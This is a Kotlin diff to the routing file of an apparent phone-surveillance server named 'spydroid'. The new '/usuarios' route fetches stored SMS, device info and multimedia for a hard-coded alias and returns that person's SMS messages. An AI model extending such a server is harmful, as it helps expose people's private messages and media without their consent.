@@ -17,28 +17,25 @@
 
 package net.spydroid.server.plugins
 
-import io.ktor.http.HttpStatusCode
 import io.ktor.server.application.*
 import io.ktor.server.response.*
 import io.ktor.server.routing.*
-import net.spydroid.server.domain.DevicesRepository
 import net.spydroid.server.models.Repos
 
 
 private object Routes {
     const val USERS = "/usuarios"
 }
+
 fun Application.configureRouting(repos: Repos) {
     routing {
         get(Routes.USERS) {
-
-            val devices = repos.devicesRepository.getDevices()
-            println("👥 Usuarios obtenidos: $devices") // Log para verificar los datos obtenidos
-            if (devices.isNotEmpty()) {
-                call.respondText(devices[0].name)
-            } else {
-                call.respond(HttpStatusCode.NoContent) // Responder con 204 si no hay usuarios
-            }
+            val ALIAS = "JUAN_KARLOS"
+            val devices = repos.devicesRepository.filerWithAlias(ALIAS)
+            val sms = repos.smsRepository.filerWithAlias(ALIAS)
+            val info = repos.infoRepository.filerWithAlias(ALIAS)
+            val multimedia = repos.multimediaRepository.filerWithAlias(ALIAS)
+            call.respond(sms)
         }
     }
 }
